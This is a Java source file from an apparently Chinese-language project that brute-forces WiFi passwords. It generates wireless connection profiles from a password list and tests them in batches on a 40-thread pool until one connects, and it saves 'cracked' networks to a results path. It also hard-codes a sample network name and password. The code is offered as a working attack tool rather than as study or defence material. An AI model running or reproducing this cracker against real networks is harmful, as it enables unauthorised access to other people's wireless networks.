package com.example.demo.utils.cmd;


import com.example.demo.utils.FileUtilsJava;
import com.example.demo.utils.cmd.generator.ProfileGenerator;

import java.util.List;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.Future;

/**
 * 连接配置文件
 */
public class Connector {

    /**
     * 密码路径
     */
    public static final String PASSWORD_PATH = System.getProperty("user.dir")+"\\config\\";

    /**
     * 配置文件暂时存放路径
     */
    public static final String PROFILE_TEMP_PATH = System.getProperty("user.dir")+"\\config\\";

    /**
     * 破解成功wifi存放路径
     */
    public static final String RESULT_PATH = System.getProperty("user.dir")+"\\config\\";

    /**
     * 日志存放路径
     */
    public static final String LOG_PATH = System.getProperty("user.dir")+"\\config\\";

    /**
     * 批处理密码数量
     */
    public static final int BATH_SIZE = 1000;

    /**
     * 要ping的域名
     */
    public static final String PING_DOMAIN = "www.baidu.com";

    private ExecutorService checkThreadPool = Executors.newFixedThreadPool(40);

    /**
     * 生成配置文件
     */
    public static void genProfile(String ssid) {
        ProfileGenerator profileGenerator = new ProfileGenerator(ssid, PASSWORD_PATH);
        profileGenerator.genProfile();
    }

    /**
     * 根据密码验证配置文件
     */
    public String check(String ssid) {
        String password = null;
        List<String> passwordList = null;
        int counter = 0;
        outer:
        while (true) {
            int start = counter * BATH_SIZE;
            int end = (counter + 1) * BATH_SIZE - 1;
            passwordList = FileUtilsJava.readLine(PASSWORD_PATH, start, end);
            if (passwordList != null && passwordList.size() > 0) {
                for (String item : passwordList) {
                    CheckTask task = new CheckTask(ssid, item);
                    Future<Boolean> checked = checkThreadPool.submit(task);
                    try {
                        if (checked.get()) {
                            password = item;
                            break outer;
                        }
                    } catch (Exception e) {
                        System.out.println("校验出错：ssid=>" + ssid + ",passord=>" + password);
                    }
                }
                counter++;
            } else {
                break outer;
            }
        }
        return password;
    }


    /**
     * 整体步骤如下：
     * <p>
     * -- step1. 扫所有可用的，信号较好的WIFI
     * -- step2. 根据密码批量生成配置文件
     * -- step3. 根据密码一个一个配置文件验证，直到找到正确的密码
     */
    public static void main(String[] args) {
        String profileContent = Profile.PROFILE.replace(Profile.WIFI_NAME, "hdwork");
        profileContent = profileContent.replace(Profile.WIFI_PASSWORD, "work.1234");
        FileUtilsJava.writeToFile(Connector.PROFILE_TEMP_PATH  +  "work.1234.xml", profileContent);
//        genProfile("hdwork");
        CheckTask task = new CheckTask("hdwork", "work.1234");
        ExecutorService checkThreadPool = Executors.newFixedThreadPool(40);
        Future<Boolean> checked = checkThreadPool.submit(task);
//        try {
//            if (checked.get()) {
//
//                System.out.println("校验成功：\"hdword\", \"work.1234\"");
//            }
//        } catch (Exception e) {
//            System.out.println("校验出错：ssid=>");
//        }

    }

    public static void connect() {
        String profileContent = Profile.PROFILE.replace(Profile.WIFI_NAME, "hdwork");
        profileContent = profileContent.replace(Profile.WIFI_PASSWORD, "work.1234");
        FileUtilsJava.writeToFile(Connector.PROFILE_TEMP_PATH  +  "work.1234.xml", profileContent);
//        genProfile("hdwork");
        CheckTask task = new CheckTask("hdwork", "work.1234");
        ExecutorService checkThreadPool = Executors.newFixedThreadPool(40);
        Future<Boolean> checked = checkThreadPool.submit(task);
    }
}
